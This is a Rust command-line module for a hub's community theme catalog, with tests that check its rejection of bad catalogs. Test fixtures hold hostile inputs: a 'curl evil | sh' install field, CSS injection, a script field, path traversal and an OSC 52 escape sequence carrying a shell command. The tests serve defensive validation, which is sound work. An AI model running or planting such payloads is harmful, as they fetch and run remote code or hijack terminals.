//! `agora hub themes on|off|status|update [--url URL]` (ADR-0113 decision 6): the owner's community theme catalog, run on the hub's
//! machine (the hub folder is the owner's alone). Fetching, checking and keeping are `agora_hub::theme_catalog`; this file gives it
//! the theme rules and words the outcome.
//!
//! The theme rules are the terminal client's reader (`agora_tui::theme::file::read_text`), which accepts and refuses a file exactly as
//! the web window does. It is given to the hub from here, the one crate that already links both, so the hub crate does not depend on a
//! client crate and no crate is added or split for it.
//!
//! Everything printed that came from the network (ids, field names, a theme's problems, the saved address) goes through
//! [`printable`] first, so a catalog cannot send the owner's terminal escape sequences (#1225 review F2).

use std::process::ExitCode;

use agora_hub::server;
use agora_hub::store::SqliteStore;
use agora_hub::theme_catalog::{self, printable, IndexError, Limits, Refusal, UpdateError};
use agora_i18n::{key, Arg};
use agora_tui::theme::file::{read_text, Problem, Read};

use crate::hubcli::{hub_dir, private_hub_dir, utc};
use crate::{Opts, Say};

/// The theme rules: a file is kept only when it is accepted, and every reason is kept for a refused one.
pub(crate) fn check(text: &str) -> Result<(), Vec<Problem>> {
    match read_text(text) {
        Read::Ok { .. } => Ok(()),
        Read::Refused(problems) => Err(problems),
    }
}

pub fn hub_themes(say: &Say, o: &Opts) -> ExitCode {
    let op = match o.positional.as_slice() {
        [op] if matches!(op.as_str(), "on" | "off" | "status" | "update") => op.as_str(),
        _ => {
            say.err(key!("cli-bad-arguments"), &[]);
            return ExitCode::from(2);
        }
    };
    // `--url` belongs to `update` alone; a wrong command line never creates the hub folder.
    if o.url.is_some() && op != "update" {
        say.err(key!("cli-bad-arguments"), &[]);
        return ExitCode::from(2);
    }
    let fail = |e: String| {
        say.err(key!("cli-hub-failed"), &[("reason", e.into())]);
        ExitCode::from(1)
    };
    let dir = hub_dir(o);
    if private_hub_dir(&dir).is_err() {
        return fail(dir.display().to_string());
    }
    let store = match SqliteStore::open(&dir.join("hub.db")) {
        Ok(s) => s,
        Err(e) => return fail(e.to_string()),
    };
    match op {
        "on" | "off" => {
            if let Err(e) = theme_catalog::set_on(&store, op == "on", server::now_ms()) {
                return fail(e.to_string());
            }
            say_status(say, &store)
        }
        "status" => say_status(say, &store),
        _ => update(say, o, &store),
    }
}

fn say_status(say: &Say, store: &SqliteStore) -> ExitCode {
    let s = match theme_catalog::status(store) {
        Ok(s) => s,
        Err(e) => {
            say.err(key!("cli-hub-failed"), &[("reason", e.to_string().into())]);
            return ExitCode::from(1);
        }
    };
    say.out(
        if s.on {
            key!("cli-hub-themes-on")
        } else {
            key!("cli-hub-themes-off")
        },
        &[],
    );
    if s.updated_ms == 0 {
        say.out(key!("cli-hub-themes-never-updated"), &[]);
    } else {
        say.out(
            key!("cli-hub-themes-updated-at"),
            &[
                ("count", (s.themes as i64).into()),
                ("when", utc(s.updated_ms).into()),
                ("url", printable(&s.url).into()),
            ],
        );
    }
    ExitCode::SUCCESS
}

/// `update`: exit 0 when every theme was kept, 1 when the catalog could not be read (nothing changed) or some theme was refused (the
/// others are kept, each refusal is said).
fn update(say: &Say, o: &Opts, store: &SqliteStore) -> ExitCode {
    let url = match o.url.clone() {
        Some(u) => u,
        None => match theme_catalog::saved_url(store) {
            Ok(u) => u,
            Err(e) => {
                say.err(key!("cli-hub-failed"), &[("reason", e.to_string().into())]);
                return ExitCode::from(1);
            }
        },
    };
    if url == theme_catalog::DEFAULT_INDEX_URL {
        say.err(key!("cli-hub-themes-no-url"), &[]);
        return ExitCode::from(2);
    }
    run_update(say, store, &url, Limits::default())
}

pub(crate) fn run_update(say: &Say, store: &SqliteStore, url: &str, limits: Limits) -> ExitCode {
    match theme_catalog::update(store, url, limits, check, server::now_ms()) {
        Ok(f) => {
            for (id, r) in &f.refused {
                for line in refusal_lines(say, id, r) {
                    eprintln!("{line}");
                }
            }
            say.out(
                key!("cli-hub-themes-updated"),
                &[
                    ("kept", (f.accepted.len() as i64).into()),
                    ("refused", (f.refused.len() as i64).into()),
                ],
            );
            if !theme_catalog::is_on(store).unwrap_or(false) {
                say.out(key!("cli-hub-themes-still-off"), &[]);
            }
            if f.refused.is_empty() {
                ExitCode::SUCCESS
            } else {
                ExitCode::from(1)
            }
        }
        Err(e) => {
            let reason = match &e {
                UpdateError::Index(i) => index_text(say, i),
                UpdateError::Theme { id, error } => say.text(
                    key!("cli-hub-themes-theme-unreachable"),
                    &[
                        ("id", printable(id).into()),
                        ("reason", index_text(say, error).into()),
                    ],
                ),
                UpdateError::Store(s) => printable(s),
            };
            say.err(key!("cli-hub-themes-failed"), &[("reason", reason.into())]);
            ExitCode::from(1)
        }
    }
}

/// What is printed for one refused theme: the refusal, then each reason the theme rules give. Every piece from the network is made
/// [`printable`].
fn refusal_lines(say: &Say, id: &str, r: &Refusal<Vec<Problem>>) -> Vec<String> {
    let mut lines = vec![say.text(
        key!("cli-hub-themes-refused"),
        &[
            ("id", printable(id).into()),
            ("reason", refusal_text(say, r).into()),
        ],
    )];
    if let Refusal::Theme(problems) = r {
        let t = |id: &str, args: &[(&str, Arg)]| say.text(id, args);
        for p in problems {
            lines.push(say.text(
                key!("cli-hub-themes-problem"),
                &[(
                    "text",
                    printable(&agora_tui::theme::list::issue_text(p, &t)).into(),
                )],
            ));
        }
    }
    lines
}

fn kib(n: usize) -> Arg {
    ((n / 1024) as i64).into()
}

fn index_text(say: &Say, e: &IndexError) -> String {
    match e {
        IndexError::Address => say.text(key!("cli-hub-themes-index-address"), &[]),
        IndexError::Fetch => say.text(key!("cli-hub-themes-index-fetch"), &[]),
        IndexError::TimedOut => say.text(key!("cli-hub-themes-index-timeout"), &[]),
        IndexError::Status(s) => say.text(
            key!("cli-hub-themes-index-status"),
            &[("status", i64::from(*s).into())],
        ),
        IndexError::TooLarge => say.text(
            key!("cli-hub-themes-index-too-large"),
            &[("max", kib(theme_catalog::MAX_INDEX_BYTES))],
        ),
        IndexError::Json => say.text(key!("cli-hub-themes-index-json"), &[]),
        IndexError::Format => say.text(key!("cli-hub-themes-index-format"), &[]),
        IndexError::Newer => say.text(key!("cli-hub-themes-index-newer"), &[]),
        IndexError::UnknownField(f) => say.text(
            key!("cli-hub-themes-index-unknown-field"),
            &[("field", printable(f).into())],
        ),
        IndexError::TooMany => say.text(
            key!("cli-hub-themes-index-too-many"),
            &[("max", (theme_catalog::MAX_ENTRIES as i64).into())],
        ),
    }
}

fn refusal_text<P>(say: &Say, r: &Refusal<P>) -> String {
    match r {
        Refusal::Entry(field) => say.text(
            key!("cli-hub-themes-refused-entry"),
            &[("field", (*field).into())],
        ),
        Refusal::UnknownField(f) => say.text(
            key!("cli-hub-themes-refused-unknown-field"),
            &[("field", printable(f).into())],
        ),
        Refusal::Duplicate => say.text(key!("cli-hub-themes-refused-duplicate"), &[]),
        Refusal::Status(s) => say.text(
            key!("cli-hub-themes-refused-status"),
            &[("status", i64::from(*s).into())],
        ),
        Refusal::TooLarge => say.text(
            key!("cli-hub-themes-refused-too-large"),
            &[("max", kib(theme_catalog::MAX_THEME_BYTES))],
        ),
        Refusal::Total => say.text(
            key!("cli-hub-themes-refused-total"),
            &[("max", kib(theme_catalog::MAX_TOTAL_BYTES))],
        ),
        Refusal::Hash => say.text(key!("cli-hub-themes-refused-hash"), &[]),
        Refusal::NotText => say.text(key!("cli-hub-themes-refused-not-text"), &[]),
        Refusal::Theme(_) => say.text(key!("cli-hub-themes-refused-theme"), &[]),
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;
    use std::collections::HashMap;
    use std::io::{Read as _, Write as _};
    use std::net::TcpListener;
    use std::sync::{Arc, Mutex};
    use std::time::Duration;

    use agora_i18n::Catalog;

    const HARBOUR: &str = include_str!("../../agora-tui/src/theme/testdata/harbour.json");
    const NIGHT: &str = r##"{"agora-theme": 1, "name": "Night", "scheme": "dark", "tokens": {"accent": "#ff9f43", "on-accent": "#1a1000"}}"##;

    /// What the test server answers for a path.
    #[derive(Clone)]
    enum Answer {
        Body(u16, String, Vec<u8>),
        /// A byte every 50 ms, for ever (a server that never finishes).
        Drip,
    }

    fn ok(body: &str) -> Answer {
        Answer::Body(200, String::new(), body.as_bytes().to_vec())
    }

    /// A plain HTTP server on this machine answering each path from `answers`; returns its address and the paths asked.
    fn serve(answers: HashMap<String, Answer>) -> (String, Arc<Mutex<Vec<String>>>) {
        let l = TcpListener::bind("127.0.0.1:0").unwrap();
        let base = format!("http://127.0.0.1:{}", l.local_addr().unwrap().port());
        let asked = Arc::new(Mutex::new(Vec::new()));
        let seen = Arc::clone(&asked);
        std::thread::spawn(move || {
            for s in l.incoming() {
                let Ok(mut s) = s else { continue };
                let answers = answers.clone();
                let seen = Arc::clone(&seen);
                std::thread::spawn(move || {
                    let mut got = [0u8; 2048];
                    let n = s.read(&mut got).unwrap_or(0);
                    let req = String::from_utf8_lossy(&got[..n]).to_string();
                    let path = req.split(' ').nth(1).unwrap_or("").to_string();
                    seen.lock().unwrap().push(path.clone());
                    match answers.get(&path).cloned() {
                        Some(Answer::Body(status, headers, body)) => {
                            let _ = s.write_all(
                                format!(
                                    "HTTP/1.0 {status} X\r\n{headers}Content-Length: {}\r\n\r\n",
                                    body.len()
                                )
                                .as_bytes(),
                            );
                            let _ = s.write_all(&body);
                        }
                        Some(Answer::Drip) => {
                            let _ = s.write_all(b"HTTP/1.0 200 OK\r\n\r\n{");
                            while s.write_all(b" ").is_ok() {
                                std::thread::sleep(Duration::from_millis(50));
                            }
                        }
                        None => {
                            let _ =
                                s.write_all(b"HTTP/1.0 404 Not Found\r\nContent-Length: 0\r\n\r\n");
                        }
                    }
                });
            }
        });
        (base, asked)
    }

    fn sha(data: &[u8]) -> String {
        ring::digest::digest(&ring::digest::SHA256, data)
            .as_ref()
            .iter()
            .map(|b| format!("{b:02x}"))
            .collect()
    }

    fn entry(id: &str, version: u32, data: &str) -> serde_json::Value {
        serde_json::json!({"id": id, "name": format!("Theme {id}"), "version": version, "author": "Ada",
            "licence": "MIT", "sha256": sha(data.as_bytes()), "file": format!("themes/{id}.json")})
    }

    fn index(entries: Vec<serde_json::Value>) -> String {
        serde_json::json!({"agora-theme-catalog": 1, "themes": entries}).to_string()
    }

    /// Room enough for a loaded test machine; only the cases that test the deadline use [`quick`].
    fn roomy() -> Limits {
        Limits {
            step: Duration::from_secs(10),
            deadline: Duration::from_secs(60),
        }
    }

    fn quick() -> Limits {
        Limits {
            step: Duration::from_millis(300),
            deadline: Duration::from_millis(900),
        }
    }

    fn say() -> Say {
        Say(Catalog::english())
    }

    fn ids(store: &SqliteStore) -> Vec<(String, u32)> {
        theme_catalog::set_on(store, true, 1).unwrap();
        theme_catalog::list(store)
            .unwrap()
            .entries
            .into_iter()
            .map(|e| (e.id, e.version))
            .collect()
    }

    #[test]
    fn good_themes_are_kept_and_each_bad_one_is_refused_with_its_reason() {
        let big = format!(
            "{{\"agora-theme\": 1, \"name\": \"Big\", \"x\": \"{}\"}}",
            "a".repeat(300 * 1024)
        );
        let bad_colour =
            r#"{"agora-theme": 1, "name": "Bad", "scheme": "dark", "tokens": {"accent": "red"}}"#;
        let extra = r#"{"agora-theme": 1, "name": "Extra", "scheme": "dark", "tokens": {}, "script": "alert(1)"}"#;
        let css = r#"{"agora-theme": 1, "name": "Css", "scheme": "dark", "tokens": {"font-ui": "x; } body { background: url(https://evil)"}}"#;
        let mut wrong_hash = entry("wrong-hash", 1, NIGHT);
        wrong_hash["sha256"] = sha(b"something else").into();
        let mut extra_entry = entry("extra-entry", 1, NIGHT);
        extra_entry["install"] = "curl evil | sh".into();
        let mut escape = entry("escape", 1, NIGHT);
        escape["file"] = "../secret.json".into();
        let idx = index(vec![
            entry("harbour", 3, HARBOUR),
            entry("night", 1, NIGHT),
            wrong_hash,
            entry("big", 1, &big),
            entry("bad-colour", 1, bad_colour),
            entry("extra", 1, extra),
            entry("css", 1, css),
            extra_entry,
            escape,
            entry("moved", 1, NIGHT),
            entry("missing", 1, NIGHT),
        ]);
        let mut a = HashMap::new();
        a.insert("/cat/index.json".to_string(), ok(&idx));
        for (id, body) in [
            ("harbour", HARBOUR),
            ("night", NIGHT),
            ("wrong-hash", NIGHT),
            ("big", &big),
            ("bad-colour", bad_colour),
            ("extra", extra),
            ("css", css),
        ] {
            a.insert(format!("/cat/themes/{id}.json"), ok(body));
        }
        a.insert(
            "/cat/themes/moved.json".into(),
            Answer::Body(
                301,
                "Location: /cat/themes/night.json\r\n".into(),
                Vec::new(),
            ),
        );
        let (base, asked) = serve(a);
        let store = SqliteStore::open_in_memory().unwrap();
        let url = format!("{base}/cat/index.json");
        let f = theme_catalog::update(&store, &url, roomy(), check, 10).unwrap();
        assert_eq!(
            f.accepted
                .iter()
                .map(|a| a.entry.id.as_str())
                .collect::<Vec<_>>(),
            ["harbour", "night"]
        );
        // The file is kept exactly as fetched.
        assert_eq!(f.accepted[0].data, HARBOUR);
        let refused: HashMap<&str, &str> = f
            .refused
            .iter()
            .map(|(id, r)| (id.as_str(), r.code()))
            .collect();
        assert_eq!(
            refused,
            HashMap::from([
                ("wrong-hash", "hash"),
                ("big", "too-large"),
                ("bad-colour", "theme"),
                ("extra", "theme"),
                ("css", "theme"),
                ("extra-entry", "unknown-field"),
                ("escape", "entry"),
                ("moved", "status"),
                ("missing", "status"),
            ])
        );
        // The theme rules name every reason: an unknown field, and a font list that is not one.
        let problems = |id: &str| match &f.refused.iter().find(|(i, _)| i == id).unwrap().1 {
            Refusal::Theme(p) => format!("{p:?}"),
            other => panic!("{other:?}"),
        };
        assert!(
            problems("extra").contains("UnknownField(\"script\")"),
            "{}",
            problems("extra")
        );
        assert!(
            problems("css").contains("BadValue(\"font-ui\")"),
            "{}",
            problems("css")
        );
        // No redirect was followed, and nothing outside the index's folder was asked for.
        let asked = asked.lock().unwrap().clone();
        assert_eq!(
            asked
                .iter()
                .filter(|p| *p == "/cat/themes/night.json")
                .count(),
            1,
            "{asked:?}"
        );
        assert!(asked.iter().all(|p| p.starts_with("/cat/")), "{asked:?}");
        assert_eq!(
            ids(&store),
            [("harbour".to_string(), 3), ("night".to_string(), 1)]
        );
        assert_eq!(theme_catalog::saved_url(&store).unwrap(), url);
        // The command says so and exits 1, since some were refused.
        assert_eq!(run_update(&say(), &store, &url, roomy()), ExitCode::from(1));
    }

    #[test]
    fn a_catalog_that_cannot_be_read_changes_nothing() {
        let good = index(vec![entry("night", 2, NIGHT)]);
        let mut a = HashMap::new();
        a.insert("/good/index.json".to_string(), ok(&good));
        a.insert("/good/themes/night.json".to_string(), ok(NIGHT));
        a.insert("/slow/index.json".to_string(), Answer::Drip);
        a.insert(
            "/slowtheme/index.json".to_string(),
            ok(&index(vec![entry("night", 3, NIGHT)])),
        );
        a.insert("/slowtheme/themes/night.json".to_string(), Answer::Drip);
        a.insert(
            "/huge/index.json".to_string(),
            ok(&" ".repeat(theme_catalog::MAX_INDEX_BYTES + 1)),
        );
        a.insert(
            "/extra/index.json".to_string(),
            ok(r#"{"agora-theme-catalog": 1, "themes": [], "plugins": []}"#),
        );
        let (other, other_asked) = serve(HashMap::new());
        a.insert(
            "/redirect/index.json".to_string(),
            Answer::Body(302, format!("Location: {other}/index.json\r\n"), Vec::new()),
        );
        let (base, _) = serve(a);
        let store = SqliteStore::open_in_memory().unwrap();
        let good_url = format!("{base}/good/index.json");
        assert_eq!(
            run_update(&say(), &store, &good_url, roomy()),
            ExitCode::SUCCESS
        );
        assert_eq!(ids(&store), [("night".to_string(), 2)]);
        let cases = [
            ("/slow/index.json", UpdateError::Index(IndexError::TimedOut)),
            (
                "/slowtheme/index.json",
                UpdateError::Theme {
                    id: "night".into(),
                    error: IndexError::TimedOut,
                },
            ),
            ("/huge/index.json", UpdateError::Index(IndexError::TooLarge)),
            (
                "/extra/index.json",
                UpdateError::Index(IndexError::UnknownField("plugins".into())),
            ),
            (
                "/redirect/index.json",
                UpdateError::Index(IndexError::Status(302)),
            ),
            (
                "/nothing/index.json",
                UpdateError::Index(IndexError::Status(404)),
            ),
        ];
        for (path, want) in cases {
            // Only the servers that never finish are held to a short deadline, which must then end the update promptly.
            let drips = matches!(
                want,
                UpdateError::Index(IndexError::TimedOut) | UpdateError::Theme { .. }
            );
            let started = std::time::Instant::now();
            let limits = if drips { quick() } else { roomy() };
            let r = theme_catalog::update(&store, &format!("{base}{path}"), limits, check, 20);
            assert_eq!(r.unwrap_err(), want, "{path}");
            if drips {
                assert!(
                    started.elapsed() < Duration::from_secs(10),
                    "{path} took {:?}",
                    started.elapsed()
                );
            }
            assert_eq!(ids(&store), [("night".to_string(), 2)], "{path}");
            assert_eq!(
                theme_catalog::saved_url(&store).unwrap(),
                good_url,
                "{path}"
            );
        }
        // The redirect's target was never asked.
        assert!(other_asked.lock().unwrap().is_empty());
        // Plain http to another machine is refused before anything is fetched.
        assert_eq!(
            theme_catalog::update(&store, "http://example.com/index.json", roomy(), check, 30)
                .unwrap_err(),
            UpdateError::Index(IndexError::Address)
        );
        // Every update is in the audit trail as the owner's.
        let rows = agora_hub::audit::Audit::new(&store)
            .list(0, Some("owner"), 100)
            .unwrap();
        let updates: Vec<&str> = rows
            .iter()
            .filter(|e| e.action == "theme_catalog.update")
            .map(|e| e.outcome.as_str())
            .collect();
        assert_eq!(
            updates,
            ["ok", "failed", "failed", "failed", "failed", "failed", "failed", "failed"]
        );
    }

    /// The switch is the owner's, on the hub's machine: kept in the hub's folder (closed to every other user), off until turned on,
    /// and each change is in the audit trail. A wrong command line changes nothing.
    #[test]
    fn the_owner_turns_the_catalog_on_and_off_on_the_hubs_machine() {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map_or(0, |d| d.as_nanos());
        let dir =
            std::env::temp_dir().join(format!("agora-themes-test-{}-{nanos}", std::process::id()));
        let opts = |words: &[&str], url: Option<&str>| Opts {
            hub_dir: Some(dir.clone()),
            positional: words.iter().map(|w| w.to_string()).collect(),
            url: url.map(str::to_string),
            ..Opts::default()
        };
        let say = say();
        assert_eq!(
            hub_themes(&say, &opts(&["status", "x"], None)),
            ExitCode::from(2)
        );
        assert_eq!(
            hub_themes(&say, &opts(&["on"], Some("https://h.example/i.json"))),
            ExitCode::from(2)
        );
        assert!(
            !dir.exists(),
            "a wrong command line never creates the hub folder"
        );
        assert_eq!(
            hub_themes(&say, &opts(&["status"], None)),
            ExitCode::SUCCESS
        );
        let store = || SqliteStore::open(&dir.join("hub.db")).unwrap();
        assert!(!theme_catalog::is_on(&store()).unwrap());
        // Without an address there is nothing to fetch: the placeholder is never asked.
        assert_eq!(
            hub_themes(&say, &opts(&["update"], None)),
            ExitCode::from(2)
        );
        assert_eq!(hub_themes(&say, &opts(&["on"], None)), ExitCode::SUCCESS);
        assert!(theme_catalog::is_on(&store()).unwrap());
        assert_eq!(hub_themes(&say, &opts(&["off"], None)), ExitCode::SUCCESS);
        assert!(!theme_catalog::is_on(&store()).unwrap());
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(
                std::fs::metadata(&dir).unwrap().permissions().mode() & 0o077,
                0
            );
        }
        let rows = agora_hub::audit::Audit::new(&store())
            .list(0, None, 100)
            .unwrap();
        let seen: Vec<(&str, &str)> = rows
            .iter()
            .map(|e| (e.who.as_str(), e.action.as_str()))
            .collect();
        assert_eq!(
            seen,
            [
                ("owner", "theme_catalog.on"),
                ("owner", "theme_catalog.off")
            ]
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// #1225 review F2: field names from an untrusted index or theme (a clipboard write by OSC 52, a cleared screen, text turned
    /// around) reach the owner's terminal only as visible escapes.
    #[test]
    fn nothing_from_the_catalog_reaches_the_terminal_as_an_escape_sequence() {
        let evil = "\u{1b}]52;c;Y3VybCBlLmNvfHNoCg==\u{7}\u{1b}[2J\u{202e}x\nFAKE";
        let bad = |s: &str| {
            s.chars()
                .any(|c| c.is_control() || agora_core::text::is_hidden(c))
        };
        let mut e = entry("a", 1, NIGHT);
        e[evil] = 1.into();
        let (_, refused) = theme_catalog::read_index::<Vec<Problem>>(&index(vec![e])).unwrap();
        let theme = format!(
            r#"{{"agora-theme": 1, "name": "X", "scheme": "dark", "tokens": {{}}, {}: 1}}"#,
            serde_json::Value::from(evil)
        );
        let problems = check(&theme).unwrap_err();
        let mut top = serde_json::json!({"agora-theme-catalog": 1, "themes": []});
        top[evil] = 1.into();
        let top_err = theme_catalog::read_index::<()>(&top.to_string())
            .map(|_| ())
            .unwrap_err();
        for say in [Say(Catalog::english()), Say(Catalog::turkish())] {
            let mut printed = refusal_lines(&say, &refused[0].0, &refused[0].1);
            printed.extend(refusal_lines(&say, evil, &Refusal::Theme(problems.clone())));
            printed.push(index_text(&say, &top_err));
            printed.push(index_text(&say, &IndexError::UnknownField(evil.into())));
            assert!(printed.len() >= 5);
            for line in &printed {
                assert!(!bad(line), "{line:?}");
            }
            assert!(
                printed.iter().any(|l| l.contains(r"\u{1b}]52;c;")),
                "{printed:?}"
            );
        }
    }

    /// #1225 review F3: a theme file whose server is busy or failing stops the update with nothing changed, not the theme dropped.
    #[test]
    fn a_busy_or_failing_server_changes_nothing() {
        let idx = index(vec![entry("night", 2, NIGHT)]);
        let mut a = HashMap::new();
        a.insert("/good/index.json".to_string(), ok(&idx));
        a.insert("/good/themes/night.json".to_string(), ok(NIGHT));
        for (dir, status) in [("busy", 429u16), ("down", 503)] {
            a.insert(
                format!("/{dir}/index.json"),
                ok(&index(vec![entry("night", 3, NIGHT)])),
            );
            a.insert(
                format!("/{dir}/themes/night.json"),
                Answer::Body(status, String::new(), Vec::new()),
            );
        }
        let (base, _) = serve(a);
        let store = SqliteStore::open_in_memory().unwrap();
        theme_catalog::update(
            &store,
            &format!("{base}/good/index.json"),
            roomy(),
            check,
            1,
        )
        .unwrap();
        for (dir, status) in [("busy", 429u16), ("down", 503)] {
            assert_eq!(
                theme_catalog::update(
                    &store,
                    &format!("{base}/{dir}/index.json"),
                    roomy(),
                    check,
                    2
                )
                .unwrap_err(),
                UpdateError::Theme {
                    id: "night".into(),
                    error: IndexError::Status(status)
                }
            );
            assert_eq!(ids(&store), [("night".to_string(), 2)], "{dir}");
        }
    }

    #[test]
    fn every_refusal_and_index_problem_has_a_sentence() {
        let say = say();
        let refusals: Vec<Refusal<Vec<Problem>>> = vec![
            Refusal::Entry("version"),
            Refusal::UnknownField("x".into()),
            Refusal::Duplicate,
            Refusal::Status(404),
            Refusal::TooLarge,
            Refusal::Total,
            Refusal::Hash,
            Refusal::NotText,
            Refusal::Theme(Vec::new()),
        ];
        for r in &refusals {
            let t = refusal_text(&say, r);
            assert!(!t.starts_with("cli-"), "{t}");
        }
        for e in [
            IndexError::Address,
            IndexError::Fetch,
            IndexError::TimedOut,
            IndexError::Status(500),
            IndexError::TooLarge,
            IndexError::Json,
            IndexError::Format,
            IndexError::Newer,
            IndexError::UnknownField("x".into()),
            IndexError::TooMany,
        ] {
            for say in [Say(Catalog::english()), Say(Catalog::turkish())] {
                let t = index_text(&say, &e);
                assert!(!t.starts_with("cli-"), "{t}");
            }
        }
    }
}
